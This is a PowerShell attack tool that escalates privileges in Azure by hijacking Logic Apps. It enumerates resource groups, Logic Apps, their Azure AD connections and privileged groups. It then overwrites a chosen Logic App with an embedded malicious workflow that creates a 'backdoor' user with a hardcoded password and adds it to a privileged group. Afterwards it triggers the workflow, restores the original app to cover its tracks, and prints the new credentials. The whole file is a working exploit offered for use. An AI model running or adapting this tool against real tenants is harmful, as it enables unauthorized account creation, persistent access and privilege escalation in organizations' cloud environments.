$UserSession = [ordered]@{
    Subscription = $null
    Token = $null
    AuthHeaders = $null
    ResourceGroup =$null
    Environment = $null
    PrivGroups = $null
    RGArray = $null
    LGArray = $null
    LGFullDict = $null
    CRArray = $null
    AzGrpPriv = $null
    DesiredPriv = $null
    AzADConns = $null
    BaseUrl = $null
    username = $null
    password = $null
}
New-Variable -Name UserSession -Value $UserSession -Scope Script -Force
$global:banner = @'

                                                   &//                          
                                       .,        %. ./                          
                                   %...,,...#.  @ .(.                           
                                  &...@@@@(../,& /*                             
                                  *,.,,%&/..(( .&                               
                                    /&,...(&(&&..%                              
                              *%#*./(.,,,,.**. ..%                              
                        .%# . . . %.,.@@@@(,.@&,./                              
                    .@. .. ..... .#..,.%&*,.,#* &                               
                 /( . .  . .....  ..&,.,...#* ..&#/                             
               #.*#*% .......... .. ........... #%..,#                          
                @(   ..... .    ........... ...,  (... %                        
                          .,,(&%(. ... ..    . %    %.. #                       
                                  (, #/ .. .. %                                 
                                    %.. .*,  %                                  
                                 (/  & ...  @ *&                                
                                &....,,....# ....(                              
                             /( &&....#... &... @# &.                           
                            %......#...@ . &... &....%                          
                           #/(....%.. # (.,*./...%..&#*                         
                          @........#% ......%#........ %                        
                          #.....&  &@ .**@  @&..**.....@                        
                          (%(.....& ..*... %..*......%&                         
                         & .......& ..*... &..*.........*                       
                         /........& ..*... &..*.........&                       
                         &%,......& ..*... &..*.......*/#                       
                        ./........& ..*... %..*.........&                       
                        %.........& /,*... & /*.........,*                      
                        /........ @,.&*... @..%........./.                      
                         &%,..........................(&(                       
                        ,,..............................%                       
                         @............................. %                       
                          /#*........................#&.                        
                           .%........................%.. ((                     
                               &@@,.... @%.....%@@( @. ...(                     
                                  % ..,   % .,*                                 
                                  & ..,   % .,*                                 
                                  & ..,   % .,*                                 
                                  & ..,   % .,*                                 
                                  &  ,,   %  ,*                                 
                                  &( @,   %# @*
                                 - @latortuga71 - 
'@ 




$global:LogicAppPayload = @'
{
    "properties": {
      "definition": {
        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
        "contentVersion": "1.0.0.0",
        "parameters": {
          "$connections": {
            "defaultValue": {},
            "type": "Object"
          }
        },
        "triggers": {
          "manual": {
            "type": "Request",
            "kind": "Http",
            "inputs": {}
          }
        },
        "actions": {
          "Add_user_to_group": {
            "runAfter": {
              "Get_group": [
                "Succeeded"
              ]
            },
            "type": "ApiConnection",
            "inputs": {
              "body": {
                "@@odata.id": "@body('Create_user')?['id']"
              },
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['changeMe']['connectionId']"
                }
              },
              "method": "post",
              "path": "/v1.0/groups/@{encodeURIComponent(body('Get_group')?['id'])}/members/$ref"
            }
          },
          "Create_user": {
            "runAfter": {},
            "type": "ApiConnection",
            "inputs": {
              "body": {
                "accountEnabled": true,
                "displayName": "backdoor01",
                "givenName": "backdoor01",
                "mailNickname": "backdoor01",
                "passwordProfile": {
                  "password": "dawoof7123!!!"
                },
                "surname": "backdoor01",
                "userPrincipalName": "backdoor01@company.io
              },
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['changeMe']['connectionId']"
                }
              },
              "method": "post",
              "path": "/v1.0/users"
            }
          },
          "Get_group": {
            "runAfter": {
              "Create_user": [
                "Succeeded"
              ]
            },
            "type": "ApiConnection",
            "inputs": {
              "host": {
                "connection": {
                  "name": "@parameters('$connections')['changeMe']['connectionId']"
                }
              },
              "method": "get",
              "path": "/v1.0/groups/@{encodeURIComponent('changeMeGroupID')}"
            }
          }
        },
        "outputs": {}
      },
      "parameters": {
        "$connections": {
          "value": {
            "changeMe": {
              "connectionId": "",
              "connectionName": "",
              "id": ""
            }
          }
        }
      },
      "endpointsConfiguration": {
        "workflow": {
          "outgoingIpAddresses": [
            {
              "address": "13.92.98.111"
            },
            {
              "address": "40.121.91.41"
            },
            {
              "address": "40.114.82.191"
            },
            {
              "address": "23.101.139.153"
            },
            {
              "address": "23.100.29.190"
            },
            {
              "address": "23.101.136.201"
            },
            {
              "address": "104.45.153.81"
            },
            {
              "address": "23.101.132.208"
            }
          ],
          "accessEndpointIpAddresses": [
            {
              "address": "137.135.106.54"
            },
            {
              "address": "40.117.99.79"
            },
            {
              "address": "40.117.100.228"
            },
            {
              "address": "137.116.126.165"
            }
          ]
        },
        "connector": {
          "outgoingIpAddresses": [
            {
              "address": "40.71.11.80/28"
            },
            {
              "address": "40.71.249.205"
            },
            {
              "address": "40.114.40.132"
            },
            {
              "address": "40.71.249.139"
            }
          ]
        }
      }
    },
    "id": "changeMeLogicAppId",
    "name": "changeMELogicAppName",
    "type": "Microsoft.Logic/workflows",
    "location": "changeMeLocation",
    "tags": {}
  }
'@



function Get-Token {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$environment
)
    if ($environment -Match "Goverment"){
        $Token = Get-AzAccessToken -Resource "https://management.azure.us" # change this to gov
        $AuthHeaders =@{
            "Content-type"="application/json";
            "Authorization"="Bearer " + $Token.Token;
        }
        return $AuthHeaders
    }
    else {
        $Token = Get-AzAccessToken -ResourceUrl "https://management.azure.com"
        $AuthHeaders =@{
            "Content-type"="application/json";
            "Authorization"="Bearer " + $Token.Token;
        }
        return $AuthHeaders
    }
    return $false
}

function Start-Login {
Param(
        [Parameter(Mandatory=$true)]
        [string]$subscriptionId,
        [Parameter(Mandatory=$true)]
        [string]$environment
)
    try {
        $context = Get-AzContext
        if (!$context){
            Connect-AzAccount -Subscription $subscriptionId -Environment $environment
            return $true
        }
        else {
            Write-Host "::: Already Logged in... :::"
            return $true
        }

    } 
    catch {
        Write-Warning $Error[0]
        return $false
    }
}

function Get-ResourceGroups{
    Param(
        [Parameter(Mandatory=$true)]
        [string]$rgScope
    )
        $rgArray = New-Object System.Collections.Generic.List[System.Object]
        if ($rgScope -ne "all"){
            Get-AzResourceGroup -Name $rgScope | ForEach-Object {
                $rgArray.Add($_)
            }
            return $rgArray
        }
        else {
        Get-AzResourceGroup | ForEach-Object {
            $rgArray.Add($_)
        }
        return $rgArray
    }
}
function Get-LogicApps {
    param(
        [Parameter(Mandatory=$true)]
        [System.Collections.Generic.List[System.Object]]$resourceGroups
    )
    $logicAppArray =  New-Object System.Collections.Generic.List[System.Object]
    $resourceGroups | ForEach-Object {
        Get-AzResource -ResourceGroupName $_.ResourceGroupName  -ResourceType Microsoft.Logic/workflows | ForEach-Object {
            $lgName = $_.Name
            Get-AzLogicApp -Name $lgName | ForEach-Object {
                $logicAppArray.Add($_)
            }
        }
    }
    return $logicAppArray
}

function Get-Connectors {
    param(
        [Parameter(Mandatory=$true)]
        [System.Collections.Generic.List[System.Object]]$resourceGroups
    )
    $connectorArray = New-Object System.Collections.Generic.List[System.Object]
    $resourceGroups | ForEach-Object {
        $rgId = $_.ResourceId
        $connectors = (Get-AzResource -ResourceGroupName $_.ResourceGroupName -ResourceType Microsoft.Web/connections)
        if ($connectors){
            $connectors |ForEach-Object {
                $azurelogicAppConnection = New-Object -TypeName psobject
                $tmp = $(Get-AzResource -ResourceId $_.Id | Select *).Properties
                $displayName = $tmp.displayName
                $apiDescription = $tmp.api.description
                $apiName = $tmp.api.name
                if ($tmp.parameterValues.'token:clientId'){
                    $servicePrincipalClientID = $tmp.parameterValues.'token:clientId'
                    $spnObjectID = (Get-AzADServicePrincipal -ApplicationId $servicePrincipalClientID).Id
                    $spnRoleAssigned = (Get-AzRoleAssignment -ObjectID $spnObjectID).RoleDefinitionName
                    $spnRoleScope = (Get-AzRoleAssignment -ObjectID $spnObjectID).Scope
                    $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermissions" -Value $spnRoleAssigned
                    $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermScope" -Value $spnRoleScope
                }
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name 'location' -Value $_.Location
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name 'Id' -Value $_.Id
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name 'connectorResourceId' -Value $_.ResourceId
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name 'Name' -Value $_.Name
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "AssociatedLogicApp" -Value ""
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name 'IsUsed' -Value 'FALSE'
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "Rg" -Value $_.ResourceGroupName
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "RgId" -Value $rgId
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionDisplayName" -Value $displayName
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "apiDescription" -Value $apiDescription
                $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "apiDisplayName" -Value $apiName
                #Write-Host "::: Attempting to gather permissions for this connection ::: "
                if ($displayName -Match "@"){
                    try {
                        $roleAssigned = (Get-AzRoleAssignment -ObjectID $(Get-AzADUser -UserPrincipalName $displayName).Id)
                        $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermissions" -Value $roleAssigned.RoleDefinitionName
                        $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermScope" -Value $roleAssigned.Scope
                    }
                    catch {
                        Write-Warning $Error[0]
                        Write-Host "::: Failed to get permissions for " $displayName " :::"
                        $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermissions" -Value "failed to get permissions" -Force
                        $azurelogicAppConnection | Add-Member -MemberType NoteProperty -Name "connectionPermScope" -Value "failted to get scope" -Force
                    }

                }
                $connectorArray.Add($azurelogicAppConnection);
            }
        }
    }
    return $connectorArray
}

function Get-FullLogicAppData {
    param(
        [Parameter(Mandatory=$true)]
        [HashTable]$authHeaders,
        [Parameter(Mandatory=$true)]
        [System.Collections.Generic.List[System.Object]]$logicAppArray
    )
    #$logicAppFullDataArray = New-Object System.Collections.Generic.List[System.Object]
    $logicAppFullDataDict = @{}
    $logicAppArray | ForEach-Object {
        if ($UserSession.Environment -match "Government"){
            $endPointUrl = "https://management.azure.us" # prob need to check this lol
        }
        else {
            $endPointUrl ="https://management.azure.com"
        }
        $url = $endPointUrl + $_.Id + '?api-version=2018-07-01-preview'
        $logicAppJson =  $(Invoke-WebRequest -Uri  $url -Method Get -Headers $authHeaders)
        #if ($logicAppJson.StatusCode -ne 200){
        #    Write-Warning "Failed to get logic App Details Exiting..."
        #    Exit
        #}
        $jsonObj = $logicAppJson | ConvertFrom-Json
        $logicAppFullDataDict[$_.Name] = $jsonObj
        $logicAppParameters = $jsonObj.properties.parameters
        $logicAppConnections = $logicAppParameters.psobject.properties.Where({$_.name -eq '$connections'}).value
        $logicAppConnectionValue = $logicAppConnections.value
        $logicAppName = $_.Name
        $logicAppConnectionValue.psobject.properties | ForEach-Object {
            $objectName = $_
            $connection = $objectName.Value             
            if($connection -ne $null)
            {
                Write-Host "::: Logic App -> " $logicAppName "Associated with connector -> " $connection.connectionName " :::"
            }
        }
    }
    return $logicAppFullDataDict
}


function Get-PrivilegedGroups {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Privs
    )
    $counter = 0
    $groupDict = @{}
    $azureGroups = Get-AzADGroup;
    $azureGroups | ForEach-Object {
        Get-AzRoleAssignment -ObjectId $_.Id | ForEach-Object {
            $roleObj = New-Object -TypeName psobject
            #grpName = $_.DisplayName
            #$grpId = $_.ObjectId
            $roleObj | Add-Member -MemberType NoteProperty -Name scope -Value $_.Scope
            $roleObj | Add-Member -MemberType NoteProperty -Name grpId -Value $_.ObjectId
            $roleObj | Add-Member -MemberType NoteProperty -Name role -Value $_.RoleDefinitionName
            if ($_.RoleDefinitionName -contains $Privs){
                $groupDict.Add($_.DisplayName,$roleObj)
                $counter++
            }
        }
    }
    if ($counter -eq 0){
        return $null
    }
    return $groupDict
}

function Get-AzureADConnections {
    param(
        [Parameter(Mandatory=$true)]
        [System.Collections.Generic.List[System.Object]]$connections
    )
    $counter = 0
    $arrayOfAzureADConnectors = New-Object System.Collections.ArrayList
    $connections | ForEach-Object {
        if ($_.apiDisplayName -Match "azuread"){
            $connectionInformation = New-Object -TypeName psobject
            $connectionInformation | Add-Member -MemberType NoteProperty -Name "location" -Value $_.location
            $connectionInformation | Add-Member -MemberType NoteProperty -Name "name" -Value $_.Name
            $connectionInformation | Add-Member -MemberType NoteProperty -Name "connectionId" -Value $_.Id
            $arrayOfAzureADConnectors.Add($connectionInformation) | Out-Null
            $counter++
        }
    }
    if ($counter -eq 0){
        return $null
    }
    return $arrayOfAzureADConnectors
}

function Get-CurrentPermissions {
  $assignedRoles = Get-AzRoleAssignment -ObjectId $(Get-AzADUser -UserPrincipalName  $((Get-AzContext).Account.Id)).Id
  $assignedRoles | ForEach-Object {
    Write-Host ":::" $_.RoleDefinitionName " -> " $_.Scope ":::"
  }
}

# main function below
function Execute-LAAMB {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$subscriptionId,
        [Parameter(Mandatory=$false)]
        [string]$domain = "",
        [Parameter(Mandatory=$false)]
        [string]$resourceGroup = "all",
        [Parameter(Mandatory=$false)]
        [string]$desiredPriv = "Contributor",
        [Parameter(Mandatory=$false)]
        [string]$username = "AzureSupport",
        [Parameter(Mandatory=$false)]
        [string]$password = "turtleshell123!!!",
        [Parameter(Mandatory=$false)]
        [switch] $Goverment
    )
    Write-Host $global:banner -ForegroundColor Red
    Start-Sleep -Seconds 2
    $UserSession.username = $username
    $UserSession.password = $password
    $UserSession.Subscription = $subscriptionId
    $UserSession.ResourceGroup = $resourceGroup
    ## if gov flag set
    if ($Goverment){
        $UserSession.Environment = "AzureUSGovernment"
    } else {
        $UserSession.Environment = "AzureCloud"
    }
    $UserSession.DesiredPriv = $desiredPriv
    if (!$resourceGroup){
        $UserSession.ResourceGroup = "all"
    }
    $loggedIn = Start-Login -subscriptionId $UserSession.Subscription -environment $UserSession.Environment
    if (!$loggedIn){
        Exit
    }
    $UserSession.AuthHeaders = Get-Token -environment $UserSession.Environment
    if (!$UserSession.AuthHeaders){
        Get-Token -environment $UserSession.Environment
        Write-Host "Failed to get auth token exiting..."
        Exit
    }
    if ($UserSession.Environment -ne "AzureCloud"){
        $UserSession.BaseUrl = "https://management.azure.gov" ## Need to fix this ?
    } else {
        $UserSession.BaseUrl = "https://management.azure.com"
    }
    Write-Host "::: Successfully Authenticated :::"
    Write-Host "::: Getting Current Permissions :::"
    Write-Host "############# CURRENT PERMISSIONS #####################"
    Get-CurrentPermissions
    Write-Host "##################################"
    (Read-Host "::: Hit enter to continue")
    Write-Host "::: Getting Resource Groups :::"
    $UserSession.RGArray = Get-ResourceGroups -rgScope $UserSession.ResourceGroup
    if (!$UserSession.RGArray){
        Write-Host "::: Error Getting ResourceGroups Exiting. :::"
        Exit
    }
    Write-Host "::: Getting Logic Apps :::"
    $UserSession.LGArray = Get-LogicApps -resourceGroups $UserSession.RGArray
    if (!$UserSession.LGArray){
        Write-Host "::: No logic apps found Exiting. :::"
        Exit
    }
    Write-Host "::: Getting Logic App Connections :::"
    $UserSession.CRArray = Get-Connectors -resourceGroups $UserSession.RGArray
    if (!$UserSession.CRArray){
        Write-Host "::: No Logic App Connections Found Exiting. :::"
        Exit
    }
    Write-Host "::: Getting Logic App Full Json Data :::"
    $UserSession.LGFullDict = Get-FullLogicAppData -authHeaders $UserSession.AuthHeaders -logicAppArray $UserSession.LGArray
   
    Write-Host "::: Getting Azure Group With Requested Privs :::"
    $UserSession.AzGrpPriv = Get-PrivilegedGroups -Privs $UserSession.DesiredPriv
    if (!$UserSession.AzGrpPriv){
        Write-Host "::: No Azure Group With Requested Privs Found Exiting. :::"
        Exit
    }
    Write-Host "::: Checking if connections have AzureAd Rights :::"
    $UserSession.AzADConns = Get-AzureADConnections -connections $UserSession.CRArray
    if (!$UserSession.AzADConns){
        Write-Host "::: No azureAD Connections Found Exiting. :::"
        Exit
    }
    ##### START BAD STUFF ####

    #### logic app variables ###
    Write-Host "::: Pick a logic app to overWrite :::"
    $counter = 0 
    $UserSession.LGArray | ForEach-Object {
        Write-Host "::: " $counter " -> " $_.Name "(" $_.Location ")" " ::: "
        $counter++
    }
    [int]$logicAppIndex=(Read-Host "::: Enter a number ")
    $logicAppName = $UserSession.LGArray[$logicAppIndex].Name
    $logicAppLoc = $UserSession.LGArray[$logicAppIndex].Location
    $logicAppUrl = $UserSession.BaseUrl + $UserSession.LGArray[$logicAppIndex].Id + "?api-version=2016-06-01"
    $logicAppSource = $UserSession.LGFullDict[$logicAppName]
    $logicAppRG = $UserSession.LGArray[$logicAppIndex].Id.Split("/")[4]
    ### connections saved ####
    Write-Host "::: Pick a connection to use :::"
    $counter = 0 
    $UserSession.AzADConns | ForEach-Object {
        Write-Host "::: " $counter " -> " $_.Name  "(" $_.Location  ")"  " ::: "
        $counter++
    }
    [int]$connectionIndex=(Read-Host "::: Enter a number ")
    $connectionName = $UserSession.AzADConns[$connectionIndex].name
    $connectionLoc = $UserSession.AzADConns[$connectionIndex].location
    $connectionApiID = "/subscriptions/" + $UserSession.Subscription + "/providers/Microsoft.Web/locations/" + $connectionLoc + "/managedApis/azuread"
    $connectionId = $UserSession.AzADConns[$connectionIndex].connectionId

    ### CHECK IF LOCATIONS MATCH ###
    if ($connectionLoc -ne $logicAppLoc){
        Write-Warning "Error Logic App and Connection Locations Must MATCH!!! Exiting..."
        Exit
    }
    ##### AzureADGroup Info ###
    Write-Host "::: Pick an azure group to join :::"
    foreach ($key in $UserSession.AzGrpPriv.Keys) {
        $roleInfo = $UserSession.AzGrpPriv.Item($key)
        Write-Host "::: Group Name ${key} ::: "
        Write-Host "::: Permissions" $roleInfo.role " ::: "
        Write-Host "::: Permissions scope " $roleInfo.scope " ::: "
        Write-Host "##################################"
    }
    [string]$groupName=(Read-Host "::: Enter the group name ")
    $azureGroupObj = $UserSession.AzGrpPriv.Item($groupName)
    #### DONE ####
    ### Setup Payload ###
    ### Create object out of json and substitute all above variables
    $maliciousLogicApp = $global:LogicAppPayload | ConvertFrom-Json
    ## vars for each action
    # get group action
    $maliciousLogicApp.properties.definition.actions.Get_group.inputs.host.connection.name = "@parameters('`$connections')['{0}']['connectionId']" -f ($connectionName)
    $maliciousLogicApp.properties.definition.actions.Get_group.inputs.path = "/v1.0/groups/@{{encodeURIComponent(`'{0}`')}}" -f ($azureGroupObj.grpId)
    ## create user action
    if ($domain -eq ""){
      $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.userPrincipalName = $UserSession.username + "@" +  (Get-AzADUser).userPrincipalName[1].Split("@")[1]
    } else {
      $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.userPrincipalName = $UserSession.username + "@" +  $domain
    }
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.surname = $UserSession.username
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.passwordProfile.password  = $UserSession.password
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.displayName  = $UserSession.username
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.givenName  = $UserSession.username
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.body.mailNickname  = $UserSession.username
    $maliciousLogicApp.properties.definition.actions.Create_user.inputs.host.connection.name = "@parameters('`$connections')['{0}']['connectionId']" -f ($connectionName)
    # add user to group
    $maliciousLogicApp.properties.definition.actions.Add_user_to_group.inputs.host.connection.name = "@parameters('`$connections')['{0}']['connectionId']" -f ($connectionName)
    ### parameters vars
    $maliciousLogicApp.properties.parameters.'$connections'.value.PSObject.Properties.Remove('changeMe')
    $connectionObj = New-Object -type psobject 
    $connectionObj | Add-Member -MemberType NoteProperty -Name "ConnectionName" -Value $connectionName
    $connectionObj | Add-Member -MemberType NoteProperty -Name "ConnectionId" -Value $connectionId
    $connectionObj | Add-Member -MemberType NoteProperty -Name "Id" -Value $connectionApiID
    $maliciousLogicApp.properties.parameters.'$connections'.value | Add-Member -MemberType NoteProperty -Name $connectionName -Value $connectionObj
    ## last vars
    $maliciousLogicApp.id = $UserSession.LGArray[$logicAppIndex].Id
    $maliciousLogicApp.name = $logicAppName
    $maliciousLogicApp.location = $logicAppLoc
    ## if target logic app has identity supply one so it doesnt fail
    if ($logicAppSource.identity){
      if ($logicAppSource.identity.type -eq "SystemAssigned"){
        $maliciousLogicApp | Add-Member -MemberType NoteProperty -Name "identity" -Value @{"type"="SystemAssigned"}
      }
      else {
        $maliciousLogicApp | Add-Member -MemberType NoteProperty -Name "identity" -Value @{"type"="UserAssigned"}
      }
    }
    ## Done with payload setup
    $payload = ($maliciousLogicApp | ConvertTo-Json -Depth 10)
    $sploitResp = Invoke-WebRequest -Uri $logicAppUrl -Method PUT -body $payload -Headers $UserSession.AuthHeaders
    if ($sploitResp.StatusCode -ne 200){
        Write-Warning "Error uploading malicious logic app exiting..."
        Exit
    }
    Write-Host "::: Sucessfully uploaded malicious logic app :::"
    Start-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -TriggerName "manual"
    Write-Host "::: Started logic app :::"
    Write-Host "::: Sleeping 30 seconds... :::"
    Start-Sleep -Seconds 30
    $revertResp = Invoke-WebRequest -Uri $logicAppUrl -Method PUT -body $($logicAppSource | ConvertTo-Json -Depth 10) -Headers $UserSession.AuthHeaders
    if ($revertResp.StatusCode -ne 200){
        Write-Warning "Error failed to revert logic app...ABORT!!!"
        # feelsbadman
        Exit
    }
    Write-Host "::: Successfully reverted logic app :::"
    Write-Host "::: Should have worked try logging in with creds :::"
    Write-Host "::: Username " $UserSession.username " :::"
    Write-Host "::: Password " $UserSession.password " :::"

}